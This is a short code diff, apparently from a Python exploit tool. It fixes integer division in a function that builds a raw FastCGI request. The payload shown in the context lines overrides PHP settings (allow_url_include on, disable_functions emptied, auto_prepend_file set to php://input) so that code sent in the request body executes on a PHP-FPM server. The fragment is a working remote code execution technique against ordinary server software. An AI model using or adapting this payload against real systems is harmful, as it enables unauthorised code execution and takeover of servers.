@@ -14,7 +14,7 @@ def FastCGI():
     data += "CONTENT_LENGTH" + str(length) +  "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
     data += "disable_functions = \nauto_prepend_file = php://input\x0f" + chr(len(filename)) +"SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/"
 
-    temp1 = chr(len(data) / 256)
+    temp1 = chr(len(data) // 256)
     temp2 = chr(len(data) % 256)
     temp3 = chr(len(data) % 8)
 
